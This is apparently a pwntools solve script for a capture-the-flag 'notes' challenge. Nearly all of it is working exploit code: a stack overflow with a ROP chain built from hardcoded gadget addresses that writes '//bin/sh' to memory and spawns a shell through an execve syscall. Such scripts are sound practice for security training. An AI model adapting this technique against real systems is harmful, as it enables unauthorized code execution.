from pwn import *
from time import sleep

pname = "./notes"
context.log_level = "debug"

def cmd(stuff):
    p.sendafter(": ", stuff)

def add(id, name, size, buf):
    p.sendlineafter(": ", str(1))
    cmd(id)
    cmd(name)
    p.sendlineafter(": ", str(size))
    cmd(buf)

sc = '''
b *0x00401b81
b *0x00401795
c
'''

p = process(pname)
#p = remote("pwn.chall.bi0s.in", 34973)
gdb.attach(p, sc)
sleep(1)

# 211:0x0000000000401bc2: syscall;
syscall = 0x0000000000401bc2 

## edit note stuff 
edits = 0x00401795

# bss buffer for our rdi:
bss_buf = 0x00000000404050

alarm_plt = 0x401060
# 179:0x0000000000401bc0: pop rdi; ret;
rdi = 0x0000000000401bc0

pload = b"A"*64
pload += b"C"*8
pload += p64(rdi)
pload += p64(bss_buf)
pload += p64(edits)
pload += p64(rdi)
pload += p64(0x3b)
pload += p64(alarm_plt)
pload += p64(rdi)
pload += p64(0x3b)
pload += p64(alarm_plt)
pload += p64(rdi)
pload += p64(bss_buf)
pload += p64(syscall)

add("A", "B", 60, "ABCD")
sleep(2)
add("A", "B", 600, pload )

sleep(3)
## for calling edit in the rop
p.sendafter("Note ID: ", "//bin/sh")
## may also be needed, threads are being weird - i think our heap note thread is intercepting our stdin >:(.
#p.send("//bin/sh")
#p.send("//bin/sh")

p.interactive()
